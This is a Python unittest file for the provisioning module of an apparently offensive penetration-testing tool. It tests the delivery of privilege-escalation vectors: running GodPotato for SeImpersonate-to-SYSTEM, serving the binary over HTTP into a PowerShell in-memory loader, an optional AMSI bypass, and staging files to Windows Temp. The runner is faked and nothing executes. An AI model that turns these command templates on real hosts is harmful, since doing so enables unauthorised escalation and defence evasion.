#!/usr/bin/env python3
"""Provisioning — the delivery half of escalation (fire / stage / build / put).

This is the logic the escalate loop calls back into, lifted out of the CLI so it can be
driven directly instead of only through a full `fieldkit escalate` run.

Pinned:

  * ``fire`` runs a vector's command; a ``serves=`` vector is delivered **in memory** —
    the artifact is served over HTTP and `{url}`/`{served}`/`{amsi}` are filled in at
    fire time, with the resolved filename (so GodPotato-NET4.exe works), and nothing is
    written to the target;
  * a served vector with no arsenal copy, or no ``lhost``, is *blocked* — never fired
    half-configured;
  * ``stage`` refuses cleanly when the artifact isn't in the arsenal;
  * ``build`` flips the architecture on the loop's BAD_BUILD retry;
  * ``record_proof`` links the captured step to the finding (anti-fabrication).

The subprocess runner is injected — no tool is ever invoked.
"""
import os
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from fieldkit import provision  # noqa: E402
from fieldkit.creds import Credential  # noqa: E402
from fieldkit.privesc import Vector  # noqa: E402
from fieldkit.runner import RunResult  # noqa: E402
from fieldkit.state import Store  # noqa: E402


def recording(output="nt authority\\system", exit_code=0):
    """A fake runner that records every argv it was handed."""
    seen = []

    def run(argv, env=None):
        seen.append(argv)
        return RunResult(argv, exit_code=exit_code, stdout=output)
    return run, seen


def vector(**kw):
    base = dict(key="seimpersonate:godpotato", title="SeImpersonate → SYSTEM",
                exploitability="high", safety="config-change", detection="moderate",
                command="whoami", shell="cmd", host="10.0.0.7")
    base.update(kw)
    return Vector(**base)


class ProvisionTestCase(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.store = Store.create(os.path.join(self.tmp.name, "e.db"))
        self.addCleanup(self.store.close)
        self.store.init_engagement("ACME")
        self.hid, _ = self.store.add_host("10.0.0.7", os_name="windows")
        self.cid, _ = self.store.add_credential(Credential("jdoe", "pw", domain="corp"))
        self.store.add_access(self.hid, self.cid, "smb", admin=True)
        self.host = self.store.host_by_ip("10.0.0.7")
        self.cred = self.store.credential_by_id(self.cid)
        # an arsenal holding one compiled Potato, under a category dir
        self.arsenal = os.path.join(self.tmp.name, "arsenal")
        os.makedirs(os.path.join(self.arsenal, "win-potato"))
        self.exe = os.path.join(self.arsenal, "win-potato", "GodPotato-NET4.exe")
        with open(self.exe, "w") as fh:
            fh.write("MZ")
        old = os.environ.get("FIELDKIT_ARSENAL")
        os.environ["FIELDKIT_ARSENAL"] = self.arsenal
        self.addCleanup(lambda: os.environ.__setitem__("FIELDKIT_ARSENAL", old) if old
                        else os.environ.pop("FIELDKIT_ARSENAL", None))

    def prov(self, run, cfg=None, allow=("read-only", "config-change")):
        return provision.Provisioner(
            self.store, self.host, self.cred, cfg or {}, list(allow),
            build_dir=self.tmp.name, run=run)


class FireTest(ProvisionTestCase):
    def test_plain_vector_runs_its_command(self):
        run, seen = recording("nt authority\\system")
        res = self.prov(run).fire(vector(command="C:\\Windows\\Temp\\GodPotato.exe -cmd whoami"))
        self.assertTrue(res.ok)
        self.assertIn("GodPotato.exe", " ".join(seen[0]))

    def test_served_vector_fills_url_served_and_amsi(self):
        run, seen = recording()
        v = vector(key="seimpersonate:ps-godpotato",
                   command="powershell -c \"{amsi}Load('{url}{served}')\"",
                   serves=("GodPotato",))
        res = self.prov(run, cfg={"lhost": "127.0.0.1", "amsi_bypass": "on"}).fire(v)
        self.assertTrue(res.ok)
        fired = " ".join(seen[0])
        self.assertIn("http://127.0.0.1:", fired)          # served over HTTP
        self.assertIn("GodPotato-NET4.exe", fired)         # the *resolved* filename
        self.assertNotIn("{url}", fired)
        self.assertNotIn("{served}", fired)
        self.assertNotIn("{amsi}", fired)
        self.assertIn("SetValue", fired)                   # the AMSI bypass was prepended

    def test_amsi_off_by_default_leaves_no_placeholder(self):
        run, seen = recording()
        v = vector(command="powershell -c \"{amsi}Load('{url}{served}')\"",
                   serves=("GodPotato",))
        self.prov(run, cfg={"lhost": "127.0.0.1"}).fire(v)
        fired = " ".join(seen[0])
        self.assertNotIn("{amsi}", fired)
        self.assertNotIn("SetValue", fired)                # no bypass unless asked for

    def test_served_vector_without_arsenal_copy_is_blocked_not_fired(self):
        run, seen = recording()
        v = vector(command="x {url}", serves=("NotThere",))
        res = self.prov(run, cfg={"lhost": "127.0.0.1"}).fire(v)
        self.assertIn("not in the arsenal", res.blocked)
        self.assertEqual(seen, [])                         # nothing ran

    def test_served_vector_without_lhost_is_blocked_not_fired(self):
        run, seen = recording()
        v = vector(command="x {url}", serves=("GodPotato",))
        res = self.prov(run, cfg={}).fire(v)
        self.assertIn("lhost", res.blocked)
        self.assertEqual(seen, [])

    def test_results_are_recorded_per_vector(self):
        run, _ = recording()
        p = self.prov(run)
        v = vector()
        p.fire(v)
        self.assertIn(v.key, p.results)


class StageTest(ProvisionTestCase):
    def test_missing_artifact_fails_cleanly(self):
        run, seen = recording()
        v = vector(stages=(("NotThere", "C:\\Windows\\Temp\\x.exe"),))
        res = self.prov(run).stage(v)
        self.assertFalse(res.ok)
        self.assertIn("not in the arsenal", res.detail)
        self.assertEqual(seen, [])

    def test_resolved_artifact_is_pushed(self):
        run, seen = recording("")
        v = vector(stages=(("GodPotato", "C:\\Windows\\Temp\\GodPotato.exe"),))
        res = self.prov(run).stage(v)
        self.assertTrue(res.ok, res.detail)
        self.assertIn("GodPotato", res.detail)
        self.assertTrue(seen)                              # a put-file was attempted


class RecordProofTest(ProvisionTestCase):
    def test_links_the_captured_step_to_the_finding(self):
        run, _ = recording("nt authority\\system")
        p = self.prov(run)
        v = vector(report_type="seimpersonate", cleanup="del C:\\Windows\\Temp\\x.exe")
        res = p.fire(v)

        class _Outcome:
            ok, proven = True, v
        fid = provision.record_proof(self.store, _Outcome(), p.results, self.host)
        self.assertIsNotNone(fid)
        finding = [f for f in self.store.findings() if f["id"] == fid][0]
        self.assertEqual(finding["vector_type"], "seimpersonate")
        self.assertTrue(finding["proven"])
        # anti-fabrication: the proof step is attached to the finding
        self.assertTrue(self.store.steps(finding_id=fid))
        self.assertEqual(res.step_id, self.store.steps(finding_id=fid)[0]["id"])
        # the cleanup was recorded
        self.assertTrue(any("x.exe" in (a["cleanup_cmd"] or "")
                            for a in self.store.artifacts()))

    def test_no_finding_when_nothing_was_proven(self):
        class _Outcome:
            ok, proven = False, None
        self.assertIsNone(provision.record_proof(self.store, _Outcome(), {}, self.host))
        self.assertEqual(self.store.counts()["proven_findings"], 0)


if __name__ == "__main__":  # pragma: no cover
    unittest.main()
